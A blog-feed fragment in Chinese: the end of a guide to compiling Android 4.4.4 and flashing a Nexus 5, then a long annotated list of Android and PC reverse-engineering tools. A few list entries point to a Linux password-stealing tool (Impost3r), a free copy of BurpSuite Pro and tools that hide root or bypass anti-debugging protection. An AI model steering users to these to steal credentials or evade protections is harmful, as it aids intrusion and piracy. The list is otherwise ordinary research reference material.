<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo gedit /etc/profile</span><br></pre></td></tr></table></figure>
</li>
<li><p>添加下面的环境变量，要根据安装目录修改，并保存。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Java Environment</span><br><span class="line">export JAVA_HOME=/usr/local/java/jdk1.6.0_45  </span><br><span class="line">export JRE_HOME=/usr/local/java/jdk1.6.0_45/jre  </span><br><span class="line">export CLASSPATH=.:$JAVA_HOME/lib:$JRE_HOME/lib:$CLASSPATH  </span><br><span class="line">export PATH=$JAVA_HOME/bin:$JRE_HOME/bin:$JAVA_HOME:$PATH   </span><br></pre></td></tr></table></figure></li>
<li><p>重启后使其生效并进行验证<br>也可使用下面的命令不重启使其生效，不过只针对当前域有效。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ckcat@ubuntu-machine:/usr/local/java$ source /etc/profile</span><br><span class="line">ckcat@ubuntu-machine:/usr/local/java$ </span><br></pre></td></tr></table></figure>
<p>输入java -version 进行验证，成功后如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ckcat@ubuntu-machine:~$ java -version</span><br><span class="line">java version &quot;1.6.0_45&quot;</span><br><span class="line">Java(TM) SE Runtime Environment (build 1.6.0_45-b06)</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM (build 20.45-b01, mixed mode)</span><br></pre></td></tr></table></figure>
</li>
<li><p>设置默认的Java版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo update-alternatives --config java</span><br><span class="line">sudo update-alternatives --config javac</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="二、安装依赖库"><a href="#二、安装依赖库" class="headerlink" title="二、安装依赖库"></a>二、安装依赖库</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install -y git flex bison gperf build-essential libncurses5-dev:i386 </span><br><span class="line">sudo apt-get install libx11-dev:i386 libreadline6-dev:i386 libgl1-mesa-dev g++-multilib </span><br><span class="line">sudo apt-get install tofrodos python-markdown libxml2-utils xsltproc zlib1g-dev:i386 </span><br><span class="line">sudo apt-get install dpkg-dev libsdl1.2-dev libesd0-dev</span><br><span class="line">sudo apt-get install git-core gnupg flex bison gperf build-essential  </span><br><span class="line">sudo apt-get install zip curl zlib1g-dev gcc-multilib g++-multilib </span><br><span class="line">sudo apt-get install libc6-dev-i386 </span><br><span class="line">sudo apt-get install lib32ncurses5-dev x11proto-core-dev libx11-dev </span><br><span class="line">sudo apt-get install lib32z-dev ccache</span><br><span class="line">sudo apt-get install libgl1-mesa-dev libxml2-utils xsltproc unzip m4</span><br></pre></td></tr></table></figure>
<p>Ubuntu 16.04以上的系统请务必使用上面的依赖，Ubuntu 16.04需要的依赖和Ubuntu 14.04所需要的依赖是不同的。<br>以下是Ubuntu 14.04所需要的依赖：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install git-core gnupg flex bison gperf build-essential \</span><br><span class="line">    zip curl zlib1g-dev gcc-multilib g++-multilib libc6-dev-i386 \</span><br><span class="line">    lib32ncurses5-dev x11proto-core-dev libx11-dev lib32z-dev ccache \</span><br><span class="line">    libgl1-mesa-dev libxml2-utils xsltproc unzip</span><br></pre></td></tr></table></figure>

<h2 id="三、降级make"><a href="#三、降级make" class="headerlink" title="三、降级make"></a>三、降级make</h2><p>编译android4.4.4需要make 3.81或3.82 ，所以要降级make。</p>
<blockquote>
<p>下载  make-3.82.tar.gz</p>
</blockquote>
<blockquote>
<p><a href="ftp://ftp.gnu.org/gnu/make/">ftp://ftp.gnu.org/gnu/make/</a></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -zxvf make-3.82.tar.gz</span><br><span class="line">cd make-3.82</span><br><span class="line">sudo ./configure</span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
<p>如果出现错误，可以按如下方式修改源码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">diff --git a/glob/glob.c b/glob/glob.c</span><br><span class="line">index f3911bc..e4d551e 100644</span><br><span class="line">--- a/glob/glob.c</span><br><span class="line">+++ b/glob/glob.c</span><br><span class="line">@@ -208,8 +208,6 @@ my_realloc (p, n)</span><br><span class="line">    #endif /* __GNU_LIBRARY__ || __DJGPP__ */</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-#if !defined __alloca &amp;&amp; !defined __GNU_LIBRARY__</span><br><span class="line">-</span><br><span class="line">    # ifdef    __GNUC__</span><br><span class="line">    #  undef alloca</span><br><span class="line">    #  define alloca(n)        __builtin_alloca (n)</span><br><span class="line">@@ -229,8 +227,6 @@ extern char *alloca ();</span><br><span class="line"></span><br><span class="line">    # define __alloca  alloca</span><br><span class="line"></span><br><span class="line">-#endif</span><br><span class="line">-</span><br><span class="line">    #ifndef __GNU_LIBRARY__</span><br><span class="line">    # define __stat stat</span><br><span class="line">    # ifdef STAT_MACROS_BROKEN</span><br></pre></td></tr></table></figure>
<h2 id="四、源码下载"><a href="#四、源码下载" class="headerlink" title="四、源码下载"></a>四、源码下载</h2><ol>
<li><p>使用已经打包好的源码<br><a href="https://testerhome.com/topics/2229">下载地址</a></p>
</li>
<li><p>使用清华源下载</p>
</li>
</ol>
<ul>
<li><p>使用curl下载repo到指定的目录<br> <code>curl https://storage-googleapis.lug.ustc.edu.cn/git-repo-downloads/repo &gt; ~/AOSP/repo</code></p>
</li>
<li><p>修改repo文件：是以哦那个清华源下载<br> <code>sudo gedit ~/AOSP/repo</code><br> 设置REPO_URL 为：<code>git://aosp.tuna.tsinghua.edu.cn/android/git-repo</code></p>
 <img src="/2019/11/08/%E5%AE%89%E5%8D%934-4%E7%B3%BB%E7%BB%9F%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%B9%B6%E5%88%B7%E6%9C%BA/2019-11-08-11-02-34.png" class="">
</li>
<li><p>添加权限<br>  <code>chmod a+x ~/AOSP/repo</code></p>
</li>
<li><p>初始化仓库<br> <code>repo init -u git://aosp.tuna.tsinghua.edu.cn/android/platform/manifest -b android-4.4.4_r1</code><br> 后面 -b 参数 是取的源码中的一个分支，较稳定的版本，而不加 -b 则会下载Android主线上正在开发中的最新代码.可以参看<a href="https://source.android.com/source/build-numbers">Android版本与代号对应关系 </a>。<br> 如果提示需要验证信息，使用命令：<br> <code>git config --global user.email &quot;your email address&quot;</code><br> <code>git config --global user.name &quot;your name&quot;</code></p>
</li>
<li><p>开始漫长的下载<br> <code>repo sync</code><br> 如果中途中断，重新执行repo sync即可。以后需要更新代码的话，同样运行这个命令即可。</p>
</li>
</ul>
<h2 id="五、下载驱动"><a href="#五、下载驱动" class="headerlink" title="五、下载驱动"></a>五、下载驱动</h2><ul>
<li>由于我使用的是NEXUS 5 设备，并且打算编译Android 4.4.4_r1版本，所以去官方 Nexus 和 Pixel 设备的二进制驱动下载页面：<a href="https://developers.google.com/android/drivers">https://developers.google.com/android/drivers</a> 下载了相应的二进制驱动。</li>
<li>将三个压缩包解压出的自解压脚本放在源码树的根目录下并运行将会得到一个<code>Vendor</code>目录 。</li>
</ul>
<h2 id="六、开始编译"><a href="#六、开始编译" class="headerlink" title="六、开始编译"></a>六、开始编译</h2><ul>
<li><p>命令删除所有以前编译操作的已有输出：<br>  <code>make clobber</code></p>
</li>
<li><p>使用<code> build</code>目录中的<code>envsetup.sh </code>脚本初始化环境<br>  <code>source build/envsetup.sh</code></p>
</li>
<li><p>使用lunch选择要编译的目标<br>  <code>lunch</code><br>  选择你想编译的版本，这里我选的是 aosp_hammerhead-userdebug,所以输入13，</p>
</li>
<li><p>编译代码<br>  <code>make -j4</code><br>  -j4的意思是4个线程同步编译<br>  关于cpu个数，可以用下面命令查看:<br>  <code>cat /proc/cpuinfo | grep processor</code><br>  经过漫长的等待后就编译完成界面，如果中途出错就根据错误信息谷歌一下或者重新编译。</p>
<img src="/2019/11/08/%E5%AE%89%E5%8D%934-4%E7%B3%BB%E7%BB%9F%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%B9%B6%E5%88%B7%E6%9C%BA/2019-11-08-11-05-30.png" class=""></li>
</ul>
<h2 id="七、刷入目标机器"><a href="#七、刷入目标机器" class="headerlink" title="七、刷入目标机器"></a>七、刷入目标机器</h2><ol>
<li><p>手机开启调试模式，连上电脑，执行<code>adb devices</code>命令将会显示连接的机器。</p>
</li>
<li><p>以fastboot模式启动手机，然后进行刷机<br> <code>adb reboot bootloader</code></p>
</li>
<li><p>刷机<br> <code>fastboot -w flashall</code></p>
</li>
</ol>
<p>至此整个编译源码并刷机的过成圆满结束了。</p>
<h2 id="八、遇到的一些坑"><a href="#八、遇到的一些坑" class="headerlink" title="八、遇到的一些坑"></a>八、遇到的一些坑</h2><h3 id="1-编译过程种突然中止，怎么都找不到原因"><a href="#1-编译过程种突然中止，怎么都找不到原因" class="headerlink" title="1. 编译过程种突然中止，怎么都找不到原因"></a>1. 编译过程种突然中止，怎么都找不到原因</h3><ul>
<li>可能是给的内存太小，重新编译几次就好了。</li>
</ul>
<h3 id="2-adb和fastboot都没有权限"><a href="#2-adb和fastboot都没有权限" class="headerlink" title="2. adb和fastboot都没有权限"></a>2. adb和fastboot都没有权限</h3><blockquote>
<p>可以参考<a href="https://github.com/snowdream/51-android">https://github.com/snowdream/51-android</a></p>
</blockquote>
<h3 id="3-adb以及fastboot运行后提示需要安装"><a href="#3-adb以及fastboot运行后提示需要安装" class="headerlink" title="3. adb以及fastboot运行后提示需要安装"></a>3. adb以及fastboot运行后提示需要安装</h3><p>此时可以到android源码目录运行<code> build</code>目录中的<code>envsetup.sh </code>脚本初始化环境<br>    <code>source build/envsetup.sh</code> 并 <code>lunch</code> 。</p>
<h3 id="4-刷机后进不了系统，可能是fastboot版本过高的原因。"><a href="#4-刷机后进不了系统，可能是fastboot版本过高的原因。" class="headerlink" title="4. 刷机后进不了系统，可能是fastboot版本过高的原因。"></a>4. 刷机后进不了系统，可能是fastboot版本过高的原因。</h3><p><strong>参考：</strong></p>
<p><a href="https://www.jianshu.com/p/6471bab49cb1">xposed源码编译与集成</a></p>
<p><a href="https://bbs.pediy.com/thread-218366.htm">记一次安卓系统源码下载过程</a></p>
<p><a href="https://bbs.pediy.com/thread-218513.htm">记一次安卓系统源码编译刷机过程</a></p>
<p><a href="https://bbs.pediy.com/thread-219233.htm">记一次安卓内核源码编译刷机过程(修改反调试标志位)</a></p>
]]></content>
      <categories>
        <category>Android源码</category>
      </categories>
      <tags>
        <tag>Android系统编译</tag>
      </tags>
  </entry>
  <entry>
    <title>工具</title>
    <url>/2020/02/02/%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<h1 id="Anroid-逆向工具"><a href="#Anroid-逆向工具" class="headerlink" title="Anroid 逆向工具"></a>Anroid 逆向工具</h1><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p><a href="https://www.pnfsoftware.com/">JEB</a> -  The Interactive Android Decompiler.</p>
<p><a href="http://www.gda.wiki:9090/">GDA</a> - GGJoy Dex Analysizer(GDA)，国内第一款也是唯一一款全交互式反编译器，同时也是世界上最早实现的dalvik字节码反编译器。</p>
<p><a href="https://www.hex-rays.com/products/ida/">IDA</a> - The IDA Disassembler and Debugger is an interactive, programmable, extensible, multi-processor disassembler hosted on Windows, Linux, or Mac OS X. IDA has become the de-facto standard for the analysis of hostile code, vulnerability research and commercial-off-the-shelf validation.</p>
<p><a href="https://github.com/NationalSecurityAgency/ghidra">Ghidra</a> - Ghidra is a software reverse engineering (SRE) framework.</p>
<p><a href="https://github.com/skylot/jadx">jadx</a> - Dex to Java decompiler.</p>
<p><a href="https://github.com/java-decompiler/jd-gui">jd-gui</a> - A standalone Java Decompiler GUI.</p>
<p><a href="https://github.com/androguard/androguard">androguard</a> - Reverse engineering, Malware and goodware analysis of Android applications … and more (ninja !).</p>
<p><a href="https://code.google.com/p/android-apktool/">ApkTool</a> - A tool for reverse engineering Android Apk Files.</p>
<p><a href="https://github.com/Konloch/bytecode-viewer">Bytecode-Viewer</a> - A Java 8 Jar &amp; Android APK Reverse Engineering Suite (Decompiler, Editor, Debugger &amp; More)</p>
<p><a href="https://github.com/pxb1988/dex2jar">Dex2Jar</a> - Tools to work with android .dex and java .class files.</p>
<p><a href="https://github.com/Storyyeller/enjarify">Enjarify</a> - Enjarify is a tool for translating Dalvik bytecode to equivalent Java bytecode. This allows Java analysis tools to analyze Android applications.</p>
<p><a href="https://github.com/JesusFreke/smali">smali&#x2F;baksmali</a> - An assembler&#x2F;disassembler for Android’s dex format.</p>
<p><a href="https://github.com/deathmarine/Luyten">Luyten</a> - An Open Source Java Decompiler Gui for Procyon.</p>
<p><a href="https://www.52pojie.cn/thread-319641-1-1.html">AndroidKiller</a> - Android killer 是一款可视化的安卓应用逆向工具，集Apk反编译、Apk打包、Apk签名，编码互转，ADB通信（应用安装-卸载-运行-设备文件管理）等特色功能于一身，支持logcat日志输出，语法高亮，基于关键字（支持单行代码或多行代码段）项目内搜索，可自定义外部工具；吸收融汇多种工具功能与特点，打造一站式逆向工具操作体验，大大简化了安卓应用&#x2F;游戏修改过程中各类繁琐工作。</p>
<p><a href="https://github.com/EiNSTeiN-/decompiler">decompiler</a> - A decompiler with multiple backend support, written in Python. Works with IDA and Capstone.</p>
<p><a href="https://github.com/zsdlove/ApkVulCheck">ApkVulCheck</a> - This is a tool to help androidcoder to check the flaws in their projects.</p>
<p><a href="https://github.com/m0bilesecurity/RMS-Runtime-Mobile-Security">RMS-Runtime-Mobile-Security</a> - Runtime Mobile Security (RMS) is a powerful web interface that helps you to manipulate Android Java Classes and Methods at Runtime.</p>
<p><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF">Mobile-Security-Framework-MobSF</a> - Mobile Security Framework (MobSF) is an automated, all-in-one mobile application (Android&#x2F;iOS&#x2F;Windows) pen-testing, malware analysis and security assessment framework capable of performing static and dynamic analysis. </p>
<p><a href="https://github.com/radareorg/cutter">cutter</a> - Free and Open Source Reverse Engineering Platform powered by radare2.</p>
<p><a href="https://github.com/google/android-classyshark">android-classyshark</a> - Analyze any Android&#x2F;Java based app or game.</p>
<p><a href="https://bbs.pediy.com/thread-259688.htm">jda</a> - apk、dex、jar 反编译工具。</p>
<p><a href="https://github.com/Surendrajat/APKLab">APKLab</a> - Android Reverse Engineering WorkBench for VS Code.</p>
<p><a href="https://github.com/chason0528/profiler">profiler</a> - 这是一个主要用于逆向工程师用来跟踪java方法调用流程的工具。</p>
<p><a href="https://github.com/panhongwei/TraceReader">TraceReader</a> - About<br>android小工具，通过读取trace文件，回溯整个整个程序执行调用树。</p>
<p>[reko]{<a href="https://github.com/uxmal/reko%7D">https://github.com/uxmal/reko}</a> - Reko is a binary decompiler.</p>
<p><a href="https://github.com/quark-engine/quark-engine">quark-engine</a> - Malware Scoring System.</p>
<p><a href="https://github.com/sonyxperiadev/ApkAnalyser">ApkAnalyser</a> - ApkAnalyser.</p>
<p><a href="https://github.com/LLVM-but-worse/java-disassembler">java-disassembler</a> - The Java Disassembler.</p>
<p><a href="https://github.com/pkilller/super-jadx">super-jadx</a> - Add new features for reverse engineering, such as: renaming of classes, fields, methods, variables, reference graphs and more.</p>
<p><a href="https://github.com/vaibhavpandeyvpz/apkstudio">apkstudio</a> - Open-source, cross platform Qt based IDE for reverse-engineering Android application packages.</p>
<p><a href="https://github.com/secure-software-engineering/FlowDroid">FlowDroid</a> - FlowDroid Static Data Flow Tracker.</p>
<h2 id="动态调试HOOK"><a href="#动态调试HOOK" class="headerlink" title="动态调试HOOK"></a>动态调试HOOK</h2><p><a href="https://github.com/CalebFenton/simplify/sdbg">sdbg</a> - Sdbg is a Smali debugger powered by SmaliVM. </p>
<p><a href="https://github.com/frida/frida">frida</a> - Dynamic instrumentation toolkit for developers, reverse-engineers, and security researchers.</p>
<p><a href="https://github.com/alibaba/arthas">Arthas</a> - Alibaba Java Diagnostic Tool Arthas&#x2F;Alibaba Java诊断利器Arthas.</p>
<p><a href="https://github.com/MerryMage/dynarmic">dynarmic</a> - An ARM dynamic recompiler.</p>
<p><a href="https://github.com/FabricMC/Enigma">Enigma</a> - This is a fork of cuchaz’s engima, a deobfuscation&#x2F;remapping tool for Java software.</p>
<p><a href="https://github.com/jmpews/Dobby">Dobby</a> - a lightweight, multi-platform, multi-architecture hook framework.</p>
<p><a href="https://github.com/wfcpc/ARM64InlineHook">ARM64InlineHook</a> - ARM64InlineHook.</p>
<p><a href="https://github.com/sensepost/objection">objection</a> - objection - runtime mobile exploration.</p>
<p><a href="https://github.com/ele7enxxh/Android-Inline-Hook">Android-Inline-Hook</a> - thumb16 thumb32 arm32 inlineHook in Android.</p>
<p><a href="https://github.com/iqiyi/xHook">xHook</a> - A PLT hook library for Android native ELF.</p>
<p><a href="https://github.com/turing-technician/FastHook">FastHook</a> - 一种高效稳定、简洁易用的Android Hook框架，实际项目验证，拥有远超其他同类框架的优异稳定性。</p>
<p><a href="https://github.com/asLody/whale">whale</a> - Hook Framework for Android&#x2F;IOS&#x2F;Linux&#x2F;MacOS.</p>
<p><a href="https://github.com/PAGalaxyLab/YAHFA">YAHFA</a> - Yet Another Hook Framework for ART.</p>
<p><a href="https://github.com/ganyao114/SandHook">SandHook</a> - Android ART Hook&#x2F;Native Inline Hook&#x2F;Single Instruction Hook - support 4.4 - 11.0 32&#x2F;64 bit - Xposed API Compat.</p>
<p><a href="https://github.com/GToad/Android_Inline_Hook">Android_Inline_Hook</a> - Build an so file to automatically do the android_native_hook work. Supports thumb-2&#x2F;arm32 and ARM64 ! With this, tools like Xposed can do android native hook.</p>
<p><a href="https://github.com/GToad/Android_Inline_Hook_ARM64">Android_Inline_Hook_ARM64</a> - Build an .so file to automatically do the android_native_hook work. Supports ARM64 ! With this, tools like Xposed can do android native hook.</p>
<p><a href="https://github.com/mar-v-in/ArtHook">ArtHook</a> - Library for hooking on ART.</p>
<p><a href="https://github.com/tiann/epic">epic</a> - Dynamic java method AOP hook for Android(continution of Dexposed on ART), Supporting 5.0~11.</p>
<p><a href="https://github.com/zhuotong/Android_InlineHook">Android_InlineHook</a> - Android内联hook框架.</p>
<p>[And64InlineHook]{<a href="https://github.com/Rprop/And64InlineHook%7D">https://github.com/Rprop/And64InlineHook}</a> - Lightweight ARMv8-A(ARM64, AArch64, Little-Endian) Inline Hook Library for Android C&#x2F;C++.</p>
<p><a href="https://github.com/woxihuannisja/StormHook">StormHook</a> - StormHook is a Android Hook Framework for Dalvik and Art.</p>
<p><a href="https://github.com/dodola/fbhookfork">fbhookfork</a> - 从 fb 的 profilo 项目里提取出来的hook 库，自己用.</p>
<p><a href="https://github.com/canyie/pine">pine</a> - Dynamic java method hook framework on ART.</p>
<p><a href="https://github.com/ChickenHook/ChickenHook">ChickenHook</a> - A linux &#x2F; android &#x2F; MacOS hooking framework.</p>
<p><a href="https://github.com/BigFaceCat2017/frida-substrate">frida-substrate</a> - substrate framework for android based on frida.</p>
<p><a href="https://github.com/darvincisec/VirtualDynamicAnalysis">VirtualDynamicAnalysis</a> - A basic android pentest environment to instrument apps without root or repackaging an app.</p>
<p><a href="https://github.com/LSPosed/LSPosed">LSPosed</a> - LSPosed Xposed Framework.</p>
<p><a href="https://github.com/FrenchYeti/dexcalibur">dexcalibur</a> - About<br>[Official] Android reverse engineering tool focused on dynamic instrumentation automation.</p>
<p><a href="https://github.com/iGio90/Dwarf">Dwarf</a> - Full featured multi arch&#x2F;os debugger built on top of PyQt5 and frida.</p>
<p><a href="https://github.com/rohanrhu/gdb-frontend">gdb-frontend</a> - GDBFrontend is an easy, flexible and extensionable gui debugger.</p>
<p><a href="https://github.com/bytedance/bhook">bhook</a> - ByteHook(aka bhook) is a PLT hook framework for Android app.</p>
<p><a href="https://github.com/smx-smx/ezinject">ezinject</a> - Modular binary injection framework.</p>
<h2 id="脱壳工具"><a href="#脱壳工具" class="headerlink" title="脱壳工具"></a>脱壳工具</h2><p><a href="https://github.com/hanbinglengyue/FART">FART</a> - ART环境下自动化脱壳方案。</p>
<p><a href="https://github.com/F8LEFT/FUPK3">FUPK3</a> - FUPK v3, 早期的一个Android半自动脱壳机。</p>
<p><a href="https://github.com/sepyeight/FartDexFix">FartDexFix</a> - hanbing大佬fart工具脱壳后dex后修复.</p>
<p><a href="https://github.com/CodingGay/BlackDex">BlackDex</a> - BlackDex</p>
<p><a href="https://github.com/Youlor/unpacker">unpacker</a> - unpacker</p>
<p><a href="https://github.com/ShivamKumarJha/android_tools">android_tools</a> - Bash scripts for ROM development stuff.</p>
<p><a href="https://github.com/iromise/fans">fans</a> - FANS: Fuzzing Android Native System Services.</p>
<p><a href="https://github.com/chason0528/profiler">profiler</a> - A tool to trace java method dynamically for android application.</p>
<p><a href="https://github.com/alitekin2fx/magiskboot">magiskboot</a> - ‘magiskboot’ command line application on linux.</p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p><a href="https://github.com/RealityNet/android_triage">android_triage</a> - Bash script to extract data from an Android device.</p>
<p><a href="https://github.com/droe/sslsplit">sslsplit</a> - 透明的 SSL&#x2F;TLS 拦截.</p>
<p><a href="https://github.com/anestisb/vdexExtractor">vdexExtractor</a> - Tool to decompile &amp; extract Android Dex bytecode from Vdex files.</p>
<p><a href="https://github.com/anestisb/android-simg2img">android-simg2img</a> - Tool to convert Android sparse images to raw images.</p>
<p><a href="https://github.com/anestisb/android-unpackbootimg">android-unpackbootimg</a> - Tools to work with Android boot images.</p>
<p><a href="https://github.com/rmnscnce/hsu">hsu</a> - Hide Magisk and root system-wide to prevent any kinds of detection.</p>
<p><a href="https://github.com/ysbing/yadb">yadb</a> - yadb是一个根据原生yadb不支持的功能做的扩展。</p>
<p><a href="https://github.com/rev1si0n/bxxt">bxxt</a> - 解包，打包 boot.img 工具。</p>
<p><a href="https://github.com/Magisk-Modules-Repo/MagiskHidePropsConf">MagiskHidePropsConf</a> - MagiskHidePropsConf.</p>
<p><a href="https://github.com/vfsfitvnm/frida-il2cpp-bridge">frida-il2cpp-bridge</a> - A Frida module to dump, trace or hijack any Il2Cpp application at runtime, without needing the global-metadata.dat file.</p>
<p><a href="https://github.com/hamibot/hamibot">hamibot</a> - Android 平台 JavaScript 自动化工具，无需 root。</p>
<p><a href="https://github.com/TUSSON/android-event-recorder">android-event-recorder</a> - 一个记录&#x2F;重放Android平台输入事件的工具，自动化测试会更容易。</p>
<p><a href="https://github.com/svengong/xcubebase">xcubebase</a> - 基于xposed的frida持久化方案。</p>
<p><a href="https://github.com/svengong/xcubebase_riru">xcubebase_riru</a> - 基于magisk 和riru的frida持久化方案。</p>
<p><a href="https://github.com/doridori/Android-Security-Reference">Android-Security-Reference</a> - A W.I.P Android Security Ref.</p>
<p><a href="https://github.com/AirtestProject/Airtest">Airtest</a> - 游戏和应用程序的 UI 自动化框架.</p>
<p><a href="https://github.com/leng-yue/py-scrcpy-client">py-scrcpy-client</a> - 一个简单易用的python scrcpy客户端。</p>
<p><a href="https://github.com/aktsk/apk-medit">apk-medit</a> - 无需root和ndk的可调试apk上的内存搜索和补丁工具。</p>
<p><a href="https://github.com/GJDuck/e9patch">e9patch</a> - 强大的静态二进制重写器.</p>
<p><a href="https://github.com/cfig/Android_boot_image_editor">Android_boot_image_editor</a> - Parsing and re-packing Android boot.img&#x2F;vbmeta.img, supporting Android 12.</p>
<p><a href="https://github.com/nightmare-space/adb_tool">adb_tool</a> - ADB TOOL，提供 adb 管理，android 端 adb 安装，开启远程调试。</p>
<p><a href="https://github.com/a13xp0p0v/kconfig-hardened-check">kconfig-hardened-check</a> - A tool for checking the security hardening options of the Linux kernel.</p>
<p><a href="https://github.com/shogo82148/androidbinary">androidbinary</a> - Android binary file parser written in golang.</p>
<p><a href="https://github.com/vm03/payload_dumper">payload_dumper</a> - Android OTA payload .</p>
<p><a href="https://github.com/Gyoonus/deoptfuscator">deoptfuscator</a> - Deobfuscator for Android Application.</p>
<p><a href="https://github.com/ashwio/arm64-pgtable-tool">arm64-pgtable-tool</a> - Tool for automatically generating MMU and translation table setup code, whether to drag and drop into your own bare metal arm64 projects or to assist you in your own learning.</p>
<h1 id="PC-逆向工具"><a href="#PC-逆向工具" class="headerlink" title="PC 逆向工具"></a>PC 逆向工具</h1><p><a href="https://github.com/x64dbg/x64dbg">x64dbg</a> - An open-source x64&#x2F;x32 debugger for windows. </p>
<p><a href="https://github.com/Air14/HyperHide">HyperHide</a> - Hypervisor based anti anti debug plugin for x64dbg.</p>
<p><a href="https://github.com/VenTaz/Themidie">Themidie</a> - x64dbg plugin to bypass Themida 3.x Anti-Debugger &#x2F; VM &#x2F; Monitoring programs checks (x64).</p>
<p><a href="https://github.com/ThunderCls/xAnalyzer">xAnalyzer</a> - xAnalyzer plugin for x64dbg.</p>
<p><a href="https://github.com/stevemk14ebr/RETools">RETools</a> - RETools.</p>
<p><a href="https://github.com/rizinorg/rizin">rizin</a> - UNIX-like reverse engineering framework and command-line toolset.</p>
<p><a href="https://github.com/nico/demumble">demumble</a> - A better c++filt and a better undname.exe, in one binary.</p>
<p><a href="https://github.com/airbus-cert/Winshark">Winshark</a> - </p>
<p><a href="https://github.com/udbg/udbg">udbg</a> - dynamic binary analysis tools.</p>
<p><a href="https://github.com/eteran/edb-debugger">edb-debugger</a> - edb is a cross-platform AArch32&#x2F;x86&#x2F;x86-64 debugger.</p>
<p><a href="https://github.com/lucasg/Dependencies">Dependencies</a> - depends.exe 的开源的现代版本。</p>
<p><a href="https://github.com/CERTCC/kaiju">kaiju</a> - CERT Kaiju is a binary analysis framework extension for the Ghidra software reverse engineering suite. </p>
<p><a href="https://github.com/4d61726b/VirtualKD-Redux">VirtualKD-Redux</a> - VirtualKD-Redux - A revival and modernization of VirtualKD.</p>
<p><a href="https://github.com/f0wl/MalwareLab_VM-Setup">MalwareLab_VM-Setup</a> - Setup scripts for my Malware Analysis VMs</p>
<p><a href="https://github.com/repnz/windbg-cheat-sheet">windbg-cheat-sheet</a> - My personal cheat sheet for using WinDbg for kernel debugging.</p>
<p><a href="https://github.com/0vercl0k/windbg-scripts">windbg-scripts</a> - A bunch of JavaScript extensions for WinDbg.</p>
<p><a href="https://github.com/cmu-sei/pharos">pharos</a> - 二进制程序的自动化静态分析工具。</p>
<p><a href="https://github.com/void-stack/VMUnprotect">VMUnprotect</a> - VMUnprotect 可以动态记录和操作来自虚拟化方法的调用。</p>
<p><a href="https://github.com/uxmal/reko">reko</a> - Reko is a binary decompiler.</p>
<p><a href="https://github.com/ClownQq/YDArk">YDArk</a> - X64内核小工具.</p>
<p><a href="https://github.com/ph4ntonn/Impost3r">Impost3r</a> - Impost3r是一个利用C语言编写,用来窃取linux下各类密码(ssh,su,sudo)的工具。</p>
<p><a href="https://github.com/HyperDbg/HyperDbg">HyperDbg</a> - HyperDbg Debugger is an open-source, community-driven, hypervisor-assisted, user-mode and kernel-mode Windows debugger with a focus on using modern hardware technologies. </p>
<h1 id="开发工具"><a href="#开发工具" class="headerlink" title="开发工具"></a>开发工具</h1><h1 id="抓包工具"><a href="#抓包工具" class="headerlink" title="抓包工具"></a>抓包工具</h1><p><a href="https://portswigger.net/burp">BurpSuite</a> - Burp Suite is a leading range of cybersecurity tools, brought to you by PortSwigger. We believe in giving our users a competitive advantage through superior research.</p>
<p><a href="https://github.com/TrojanAZhen/BurpSuitePro-2.1">BurpSuitePro-2.1</a> - 免费的BurpSuitePro版本。</p>
<p><a href="https://github.com/Mr-xn/BurpSuite-collections">BurpSuite-collections</a> - BurpSuite的插件(非商店),文章以及使用技巧的收集.</p>
<p><a href="https://github.com/leolovenet/qqwry2mmdb">qqwry2mmdb</a> - 为 Wireshark 能使用纯真网络 IP 数据库(QQwry)而提供的格式转换工具.</p>
<p><a href="https://github.com/Hackl0us/GeoIP-CN">GeoIP-CN</a> - 🇨🇳 最小巧、最准确、最实用的 中国大陆 IP 段 + GeoIP2 数据库 🇨🇳.</p>
<p><a href="https://github.com/odedshimon/BruteShark">BruteShark</a> - Network Analysis Tool.</p>
<p><a href="https://github.com/brimsec/brim">brim</a> - Desktop application to efficiently search large packet captures and Zeek logs.</p>
<p><a href="https://github.com/mitmproxy/mitmproxy">mitmproxy</a> - An interactive TLS-capable intercepting HTTP proxy for penetration testers and software developers.</p>
<p><a href="https://github.com/tomer8007/chromium-ipc-sniffer">chromium-ipc-sniffer</a> - A tool to capture communication between Chromium processes on Windows.</p>
<p><a href="https://github.com/airbus-cert/Winshark">Winshark</a> - A wireshark plugin to instrument ETW.</p>
<p><a href="https://httptoolkit.tech/">httptoolkit</a> - Intercept &amp; view all your HTTP(S).</p>
<p><a href="https://github.com/BigFaceCat2017/frida_ssl_logger">frida_ssl_logger</a> - ssl_logger based on frida.</p>
<p><a href="https://github.com/r0ysue/r0capture">r0capture</a> - 安卓应用层抓包通杀脚本.</p>
<p><a href="https://github.com/lyxhh/lxhToolHTTPDecrypt">lxhToolHTTPDecrypt</a> - Simple Android&#x2F;iOS protocol analysis and utilization tool.</p>
<p><a href="https://github.com/emanuele-f/PCAPdroid">PCAPdroid</a> - No-root network monitor and traffic dump tool for Android devices.</p>
<h1 id="编辑工具"><a href="#编辑工具" class="headerlink" title="编辑工具"></a>编辑工具</h1><p><a href="https://github.com/WerWolv/ImHex">ImHex</a> - A Hex Editor for Reverse Engineers.</p>
<p><a href="https://github.com/williamboman/nvim-lsp-installer">nvim-lsp-installer</a> - Companion plugin for nvim-lspconfig that allows you to seamlessly install LSP servers locally with :LspInstall. </p>
